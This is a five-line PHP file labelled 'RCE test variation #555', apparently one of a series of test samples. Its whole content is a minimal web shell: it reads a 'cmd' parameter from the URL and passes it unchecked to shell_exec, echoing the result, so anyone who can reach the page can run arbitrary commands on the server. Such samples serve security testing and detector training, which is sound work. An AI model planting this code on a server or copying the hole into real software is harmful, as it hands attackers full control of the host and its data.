<?php
// RCE test variation #555
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>